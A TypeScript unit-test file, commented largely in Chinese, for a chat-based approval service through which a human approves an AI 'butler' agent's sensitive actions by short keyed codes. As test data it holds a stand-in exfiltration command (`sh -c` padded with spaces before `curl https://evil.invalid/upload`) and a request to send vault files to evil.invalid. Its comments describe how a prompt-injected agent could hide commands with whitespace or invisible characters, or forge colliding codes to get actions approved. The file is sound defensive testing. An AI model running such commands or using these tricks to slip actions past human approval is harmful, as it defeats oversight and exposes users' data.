/**
 * IMA-M2 — `ImApprovalService` unit coverage: the `/inbox` projection and the
 * short-id resolve path with every IM-specific gate. The REAL authority
 * (ownership / race / two-step resume) lives in `HostInboxService.resolve`
 * and is covered by inbox-service tests; here it is a recording fake, so we
 * can also pin exactly WHAT crosses the seam (decision shape + via tag).
 */

import { describe, expect, it } from 'vitest'

import type { InboxItem } from '@gotong/inbox'

import { mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import {
  APPROVAL_CLOSE,
  APPROVAL_OPEN,
} from '../src/approval-text.js'
import {
  IM_SHORT_ID_LEN,
  ImApprovalError,
  ImApprovalService,
  imShortId,
  loadOrCreateShortCodeKey,
} from '../src/im-approval-service.js'

/**
 * 短码是 **HMAC**(八轮 M2),所以测试也要一把钥匙。固定字节:测试要的是
 * 「同一把钥匙下稳定、换一把就变」,不是随机性。
 */
const TEST_KEY = Buffer.alloc(32, 7)

function item(over: Partial<InboxItem> & { itemId: string }): InboxItem {
  return {
    userId: 'alice',
    kind: 'approval',
    prompt: '管家想执行一个敏感动作',
    parentKind: 'none',
    status: 'pending',
    createdAt: 100,
    ...over,
  } as InboxItem
}

/**
 * 测试里的短码一律**算出来**,不写字面量:短码是内容指纹(六轮 H1),写死一个
 * `'abcd'` 只会在指纹算法变的那天变成一堆看不懂的 not_found,而不是指出问题。
 *
 * 七轮 M4 起**要整串**:下限从 4 抬到 8(=全长),前缀匹配退化成相等 —— 见
 * `MIN_SHORT_ID` 的注释。所以这里不再切片。
 */
function code(i: InboxItem): string {
  return imShortId(i, TEST_KEY)
}

function service(items: InboxItem[]) {
  const resolved: Array<{
    itemId: string
    userId: string
    decision: unknown
    via?: string
    expect?: (item: InboxItem) => boolean
  }> = []
  const svc = new ImApprovalService({
    store: { listPending: async (userId) => items.filter((i) => i.userId === userId) },
    inbox: {
      resolve: async (args) => {
        resolved.push(args)
      },
    },
    shortCodeKey: TEST_KEY,
  })
  return { svc, resolved }
}

describe('ImApprovalService.listForIm', () => {
  it('projects rows newest-first with 8-char short ids', async () => {
    const older = item({
      itemId: 'aaaaaaaa-1111',
      createdAt: 100,
      imApprovable: true,
      title: '旧的',
      prompt: '甲',
    })
    const newer = item({
      itemId: 'bbbbbbbb-2222',
      createdAt: 200,
      imApprovable: true,
      title: '新的',
      prompt: '乙',
    })
    const { svc } = service([older, newer])
    const rows = await svc.listForIm('alice')
    expect(rows.map((r) => r.shortId)).toEqual([imShortId(newer, TEST_KEY), imShortId(older, TEST_KEY)])
    expect(rows[0]!.shortId).toHaveLength(IM_SHORT_ID_LEN)
    expect(rows[0]!.title).toBe('新的 · 乙')
  })

  it('两段一起渲染:IM 这行字 = 网页那张卡的两个字段(七轮 M3)', async () => {
    // 网页 `/me` 的审批卡显示 title + prompt 两段。只渲染 title 会把正文留在
    // 手机看不到的地方,而人按下 `/approve` 时读到的就只有那半句。
    const { svc } = service([
      item({
        itemId: 'two-fields',
        title: '排班确认',
        prompt: '周六早班换成小李',
        imApprovable: true,
      }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title).toBe('排班确认 · 周六早班换成小李')
    expect(rows[0]!.imApprovable).toBe(true) // 两段加起来仍在一行内 ⇒ 照常可批
  })

  it('标题已经在正文里就不说两遍(管家 park 的形状),没有标题就只渲染正文', async () => {
    const { svc } = service([
      // 没有标题 ⇒ 正文本身。
      item({ itemId: 'cccccccc-3333', prompt: '删除助手 mailer', imApprovable: true }),
      // 标题=正文。
      item({ itemId: 'dup-1', createdAt: 99, title: '删除助手 mailer', prompt: '删除助手 mailer' }),
      // 管家 park 的真实形状:prompt 是一整句框架句,title 是它的子串 —— 拼起来
      // 只会把同一件事说两遍,还平白吃掉一行预算里的二十来个字。
      item({
        itemId: 'butler-shape',
        createdAt: 98,
        title: 'delete_agent(mailer)',
        prompt: '管家「butler」想执行一个敏感动作:「delete_agent(mailer)」。原因:「危险动作」。',
      }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows.map((r) => r.title)).toEqual([
      '删除助手 mailer',
      '删除助手 mailer',
      '管家『butler』想执行一个敏感动作:『delete_agent(mailer)』。原因:『危险动作』。',
    ])
    expect(rows[0]!.imApprovable).toBe(true)
  })

  it('盲签的形状被渲染层挡下:短标题 + 一整张表的正文 ⇒ 不能在 IM 批(七轮 M3)', async () => {
    // `imApprovable` 断言的是**收件人**(这条确实指派给这个人),不是「那行字够不够」;
    // 后者是渲染层的判断——两段一起量,量出来一行放不下就降级网页。
    const { svc } = service([
      item({
        itemId: 'blind-sign',
        title: '排班确认',
        prompt: `周六早班换成小李${'、还有一长串别的改动'.repeat(12)}`,
        imApprovable: true,
      }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows).toHaveLength(1)
    expect(rows[0]!.imApprovable).toBe(false)
    expect(rows[0]!.title).toContain('已截断')
  })

  it('renders imApprovable=false for unflagged items AND for non-approval kinds', async () => {
    const { svc } = service([
      item({ itemId: 'dddddddd-4444' }), // no flag — web only
      item({ itemId: 'eeeeeeee-5555', kind: 'choice', imApprovable: true } as never),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows.every((r) => r.imApprovable === false)).toBe(true)
  })

  it('一行放不下 ⇒ 列表照列,但**不能在 IM 批**,且截断处响亮(五轮 H1)', async () => {
    // 盲签的形状:一堆空白把真正的命令顶到 80 字之外。
    // 只有正文(没有标题)⇒ 渲染的就是它本身,报的字数也就是它的长度。
    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
    const { svc } = service([item({ itemId: 'ffffffff-6666', prompt: evil, imApprovable: true })])
    const rows = await svc.listForIm('alice')
    expect(rows).toHaveLength(1) // 还是要知道有东西等着
    expect(rows[0]!.imApprovable).toBe(false)
    expect(rows[0]!.title).toContain('已截断')
    expect(rows[0]!.title).toContain(String(evil.length))
  })

  it('换行 / 不可见字符在**这一层**洗掉(第五个写入方 human 步同样受保护,五轮 H2)', async () => {
    const NL = String.fromCharCode(10)
    const ZWSP = String.fromCharCode(0x200b)
    const forged = `批准发布${NL}  • [deadbeef] 无害的小事${ZWSP}`
    const { svc } = service([item({ itemId: 'aaaa1111', title: forged, imApprovable: true })])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title).not.toContain(NL) // 伪造第二条列表行
    expect(rows[0]!.title).not.toContain(ZWSP)
    expect(rows[0]!.imApprovable).toBe(true) // 洗完仍在一行内 ⇒ 照常可批
  })
})

describe('ImApprovalService.resolveByShortId', () => {
  it('resolves a code match with the approval decision + via tag', async () => {
    const it0 = item({ itemId: 'abcd1234-xyz', imApprovable: true, title: '删除 mailer' })
    const { svc, resolved } = service([it0])
    const out = await svc.resolveByShortId({
      userId: 'alice',
      shortId: code(it0),
      approved: true,
      via: 'im:telegram',
    })
    expect(out.title).toBe('删除 mailer · 管家想执行一个敏感动作')
    expect(resolved).toHaveLength(1)
    expect(resolved[0]).toMatchObject({
      itemId: 'abcd1234-xyz',
      userId: 'alice',
      decision: { kind: 'approval', approved: true },
      via: 'im:telegram',
    })
    // 过缝的**只有**这五样(第五样是代际判据,单独有门钉它的语义)。
    expect(Object.keys(resolved[0]!).sort()).toEqual([
      'decision',
      'expect',
      'itemId',
      'userId',
      'via',
    ])
  })

  it('passes approved:false through for a deny', async () => {
    const it0 = item({ itemId: 'abcd1234', imApprovable: true })
    const { svc, resolved } = service([it0])
    await svc.resolveByShortId({
      userId: 'alice',
      shortId: imShortId(it0, TEST_KEY), // 整串短码(列表里抄下来的那个)
      approved: false,
      via: 'im:lark',
    })
    expect(resolved[0]!.decision).toEqual({ kind: 'approval', approved: false })
  })

  it('少抄一位就不算数:下限=全长,前缀不再是有效的绑定(七轮 M4)', async () => {
    const it0 = item({ itemId: 'abcd1234', imApprovable: true })
    const { svc, resolved } = service([it0])
    // 差一位的「前缀」在旧下限(4)里会**唯一**匹配上 —— 于是只绑住了 28 bit,
    // 而聊天记录里往上翻的旧短码正是靠这点撞上后来那个动作的。现在当场拒。
    await expect(
      svc.resolveByShortId({
        userId: 'alice',
        shortId: code(it0).slice(0, IM_SHORT_ID_LEN - 1),
        approved: true,
        via: 'im:t',
      }),
    ).rejects.toMatchObject({ code: 'short_id_too_short' })
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'ab', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'short_id_too_short' })
    expect(resolved).toHaveLength(0)
  })

  it('rejects an unknown code as not_found', async () => {
    const { svc } = service([item({ itemId: 'abcd1234', imApprovable: true })])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: 'zzzzzzzz', approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_found' })
  })

  it('matches within the caller own pending list only', async () => {
    // Bob owns the only item matching the code — Alice must see not_found,
    // structurally (her list simply does not contain it).
    const bobs = item({ itemId: 'abcd1234', userId: 'bob', imApprovable: true })
    const { svc, resolved } = service([bobs])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: code(bobs), approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_found' })
    expect(resolved).toHaveLength(0)
  })

  it('rejects an ambiguous code, listing the full short codes', async () => {
    // 短码是哈希 ⇒ 撞码得**找**,不能靠起名。下限抬到全长(七轮 M4)后这一支只剩
    // 真·8 位十六进制撞车这一条路,所以搜的是整串而不是前缀:按 createdAt 确定性
    // 扫(sha256 定 + 循环定 ⇒ 每次跑都是同一对,本机 t=9141/57499,约 70ms)。
    const seen = new Map<string, InboxItem>()
    let pair: [InboxItem, InboxItem] | null = null
    for (let t = 1; t < 200_000 && !pair; t++) {
      const cur = item({ itemId: `amb-${t}`, createdAt: t, imApprovable: true })
      const key = code(cur)
      const prev = seen.get(key)
      if (prev) pair = [prev, cur]
      else seen.set(key, cur)
    }
    expect(pair).not.toBeNull()
    const [a, b] = pair!
    const { svc } = service([a, b])
    const err = await svc
      .resolveByShortId({ userId: 'alice', shortId: code(a), approved: true, via: 'im:t' })
      .then(
        () => null,
        (e: unknown) => e,
      )
    expect(err).toBeInstanceOf(ImApprovalError)
    expect((err as ImApprovalError).code).toBe('ambiguous')
    expect((err as ImApprovalError).message).toContain(imShortId(a, TEST_KEY))
    expect((err as ImApprovalError).message).toContain(imShortId(b, TEST_KEY))
  })

  it('re-checks the write-time whitelist server-side (web_only, fail-closed)', async () => {
    const it0 = item({ itemId: 'abcd1234' }) // flag unset
    const { svc, resolved } = service([it0])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: code(it0), approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'web_only' })
    expect(resolved).toHaveLength(0)
  })

  it('rejects a non-approval kind even when flagged (needs a typed answer)', async () => {
    const it0 = item({ itemId: 'abcd1234', kind: 'choice', imApprovable: true } as never)
    const { svc } = service([it0])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: code(it0), approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_approval_kind' })
  })

  it('看不全就拒批:短码是从旧列表抄来的也一样(五轮 H1)', async () => {
    const evil = `sh -c '${' '.repeat(100)}curl https://evil.invalid/upload'`
    const it0 = item({ itemId: 'abcd1234', title: evil, imApprovable: true })
    const { svc, resolved } = service([it0])
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: code(it0), approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'title_truncated' })
    expect(resolved).toHaveLength(0)
  })

  it('空白标题不再遮住动作:正文就在同一行里(六轮 H2 → 七轮 M3 收窄)', async () => {
    // 六轮的攻击:`title` 写成零宽字符,列表上是一条近乎空白的行,批下去的却是
    // prompt 里那件事。两段一起渲染之后这个形状**从根上没了**——人读到的就是
    // 真正的动作,所以这条现在是可批的(挡它才叫误伤)。
    const ZWSP = String.fromCharCode(0x200b)
    const it0 = item({
      itemId: 'blank-1',
      title: ZWSP.repeat(3),
      prompt: '往 evil.invalid 发送金库文件',
      imApprovable: true,
    })
    const { svc, resolved } = service([it0])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title).toContain('往 evil.invalid 发送金库文件')
    expect(rows[0]!.title).not.toContain(ZWSP)
    expect(rows[0]!.imApprovable).toBe(true)
    await svc.resolveByShortId({
      userId: 'alice',
      shortId: rows[0]!.shortId,
      approved: true,
      via: 'im:t',
    })
    expect(resolved).toHaveLength(1)
  })

  it('两段都洗成空白 ⇒ 这行字什么都没说,降级网页(六轮 H2 + 七轮 H2)', async () => {
    // 剩下的那半个洞:标题和正文**都**只有不可见字符。列表上是一条空白的行,
    // 而批下去的是一个真实的动作 —— 空白从来不是一个完整的故事。
    // 挑的三个码点刻意不是「空白类」:U+2800 分类是符号、U+FFF9 是行间注释、
    // U+DC00 是落单的代理项 —— 白名单单看它们会答「有内容」,先洗后问才拦得住。
    const blank = [0x2800, 0xfff9, 0xdc00].map((c) => String.fromCharCode(c)).join('')
    const it0 = item({ itemId: 'blank-2', title: blank, prompt: blank, imApprovable: true })
    const { svc, resolved } = service([it0])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.imApprovable).toBe(false)
    expect(rows[0]!.title).toBe('(这条没有可显示的内容)')
    await expect(
      svc.resolveByShortId({
        userId: 'alice',
        shortId: rows[0]!.shortId,
        approved: true,
        via: 'im:t',
      }),
    ).rejects.toMatchObject({ code: 'title_truncated' })
    expect(resolved).toHaveLength(0)
  })

  it('短码是内容指纹:同一个 itemId 被下一个动作覆盖后旧短码失效(六轮 H1)', async () => {
    // 管家的 tool-loop 会在同一个 task.id 下反复 park(FileInboxStore.write 直接
    // 覆盖)。「短码=itemId 前 8 位」时,聊天记录里往上翻一条旧 `/inbox` 抄下来的
    // 短码今天仍然匹配得上——批的却是后来那个动作。
    const items = [item({ itemId: 'task-1', title: '读一个文件', imApprovable: true })]
    const { svc, resolved } = service(items)
    const stale = (await svc.listForIm('alice'))[0]!.shortId

    items[0] = item({ itemId: 'task-1', title: '往外发一封邮件', imApprovable: true })
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: stale, approved: true, via: 'im:t' }),
    ).rejects.toMatchObject({ code: 'not_found' })
    expect(resolved).toHaveLength(0)

    // 新动作有新短码,`/inbox` 重发一次就能批(不是把这条锁死)。
    const fresh = (await svc.listForIm('alice'))[0]!.shortId
    expect(fresh).not.toBe(stale)
    await svc.resolveByShortId({ userId: 'alice', shortId: fresh, approved: true, via: 'im:t' })
    expect(resolved).toHaveLength(1)
  })

  it('指纹跟着过权威边界:expect 判的是**当时那一刻的盘上那条**(七轮 H1)', async () => {
    // 这一层能做的只有「把判据交出去」——它读的是快照,而 resolve 只收 itemId。
    // 判据本身在 store 的原子 transition 里跑(见 file-inbox-store 的门)与 e2e
    // 的交错场景(im-approval-e2e act 4);这里钉的是:它真的被传了,而且认的是内容。
    const it0 = item({ itemId: 'task-1', title: '读一个文件', imApprovable: true })
    const { svc, resolved } = service([it0])
    await svc.resolveByShortId({ userId: 'alice', shortId: code(it0), approved: true, via: 'im:t' })

    const guard = resolved[0]!.expect
    expect(guard).toBeTypeOf('function')
    expect(guard!(it0)).toBe(true) // 没变过 ⇒ 放行
    // 同一个 itemId 底下换了动作(管家 tool-loop 的常态)⇒ 判据当场说不。
    expect(guard!(item({ itemId: 'task-1', title: '往外发一封邮件', imApprovable: true }))).toBe(
      false,
    )
  })

  it('批准回执里的标题是洗过的那份,不是原文(桥拿去回话)', async () => {
    const RLO = String.fromCharCode(0x202e)
    const it0 = item({ itemId: 'abcd1234', title: `删除助手 mailer${RLO}`, imApprovable: true })
    const { svc, resolved } = service([it0])
    const out = await svc.resolveByShortId({
      userId: 'alice',
      shortId: code(it0),
      approved: true,
      via: 'im:t',
    })
    expect(resolved).toHaveLength(1)
    expect(out.title).not.toContain(RLO)
    expect(out.title).toContain('删除助手 mailer')
  })

  it('lets resolve-side errors pass through untouched (one error vocabulary)', async () => {
    const boom = Object.assign(new Error('already resolved'), { code: 'already_resolved' })
    const it0 = item({ itemId: 'abcd1234', imApprovable: true })
    const svc = new ImApprovalService({
      store: { listPending: async () => [it0] },
      inbox: {
        resolve: async () => {
          throw boom
        },
      },
      shortCodeKey: TEST_KEY,
    })
    await expect(
      svc.resolveByShortId({ userId: 'alice', shortId: code(it0), approved: true, via: 'im:t' }),
    ).rejects.toBe(boom)
  })
})

describe('imRowText — 标题去重锚在框架定界符上(八轮 M1)', () => {
  it('**否定攻击**:正文里提一句标题,标题不会因此被藏起来', async () => {
    // 七轮那版问的是「正文里有没有出现标题这串字」。攻击者两头都能写:
    // 标题写成正文里必然出现的一段,标题那行就被它自己藏掉,人读到的只剩正文。
    const { svc } = service([
      item({
        itemId: 'x1',
        userId: 'alice',
        imApprovable: true,
        title: '删除生产数据库',
        prompt: '不要删除生产数据库;这里只批准查看健康状态',
      }),
    ])
    const rows = await svc.listForIm('alice')
    expect(rows[0]!.title.startsWith('删除生产数据库 · ')).toBe(true)
  })

  it('框架把标题原样嵌进自己的句子时才去重(管家 park 的那种形状)', async () => {
    const rows = await service([
      item({
        itemId: 'x2',
        userId: 'alice',
        imApprovable: true,
        title: 'delete_agent(mailer)',
        prompt: `管家「atong」想执行一个敏感动作:${APPROVAL_OPEN}delete_agent(mailer)${APPROVAL_CLOSE}。原因:「用户要求」。批准后才会执行。`,
      }),
    ]).svc.listForIm('alice')
    // 正文自己已经念了一遍动作,不再前缀一次。
    expect(rows[0]!.title.startsWith('管家')).toBe(true)
    expect(rows[0]!.title.startsWith('delete_agent(mailer) · ')).toBe(false)
    // 而且渲染出来的定界符已经被降级 —— 屏幕上的「」永远只可能是框架当场加的。
    expect(rows[0]!.title).not.toContain(APPROVAL_OPEN)
  })

  it('攻击者拼不出那个锚点:正文里写 `『标题』` 不算数', async () => {
    // 洗完之后框架的「」也会变成『』,所以「洗完再找」根本分不出是谁放的。
    // 判据必须在洗之前看 —— 那时不可信文本里的「」早已被写入方降级过了。
    const rows = await service([
      item({
        itemId: 'x3',
        userId: 'alice',
        imApprovable: true,
        title: '往外发邮件',
        prompt: '『往外发邮件』这一步已经取消,这里只是记录一下',
      }),
    ]).svc.listForIm('alice')
    expect(rows[0]!.title.startsWith('往外发邮件 · ')).toBe(true)
  })
})

describe('一行读不读得全:两处用同一把尺(八轮 L1)', () => {
  const WIDE = String.fromCodePoint(0x20000) // 增补平面的汉字:1 个码点 = 2 个码元

  it('41 个宽字符 = 41 码点 ≤ 80,完整可批(按 `.length` 算会是 82 > 80)', async () => {
    const rows = await service([
      item({ itemId: 'w1', userId: 'alice', imApprovable: true, prompt: WIDE.repeat(41) }),
    ]).svc.listForIm('alice')
    expect(rows[0]!.title).toBe(WIDE.repeat(41)) // 没被截
    expect(rows[0]!.imApprovable).toBe(true) // 也没被误判成读不全
  })

  it('81 个就是真的超了:列出来但只能在网页批', async () => {
    const rows = await service([
      item({ itemId: 'w2', userId: 'alice', imApprovable: true, prompt: WIDE.repeat(81) }),
    ]).svc.listForIm('alice')
    expect(rows[0]!.title).toContain('已截断')
    expect(rows[0]!.imApprovable).toBe(false)
  })
})

describe('短码带密钥(八轮 M2)', () => {
  it('换一把钥匙,同一条待批项的短码就不同 —— 攻击者算不出别人的码', () => {
    // 8 位十六进制只有 32 bit。不带密钥的话,被注入的阿同知道自己那次 park 的
    // title/prompt、createdAt 就在它调用工具的几十毫秒内 —— 而 HANDS-M2 之后它
    // 有手,在监狱里磨一个撞上旧码的新动作只是算力问题。带了密钥它连算都算不出来。
    const it0 = item({ itemId: 'k1' })
    const a = imShortId(it0, TEST_KEY)
    const b = imShortId(it0, Buffer.alloc(32, 9))
    expect(a).not.toBe(b)
    expect(a).toHaveLength(IM_SHORT_ID_LEN)
    // 同一把钥匙下稳定(列表里抄下来的码,过一会儿还能用)。
    expect(imShortId(it0, TEST_KEY)).toBe(a)
  })

  it('密钥文件:0600 懒生成、复用、坏了就抛(不静默重建)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'host-im-key-'))
    try {
      const first = loadOrCreateShortCodeKey(dir)
      expect(first).toHaveLength(32)
      const file = join(dir, 'runtime', 'im-shortcode.key')
      expect(statSync(file).mode & 0o777).toBe(0o600)
      // 复用:静默重建会让所有在飞的短码一起失效。
      expect(loadOrCreateShortCodeKey(dir).equals(first)).toBe(true)
      // 短了就抛:密钥被人动过是要说出来的事。
      writeFileSync(file, Buffer.alloc(8))
      expect(() => loadOrCreateShortCodeKey(dir)).toThrow(/expected at least 32/)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})
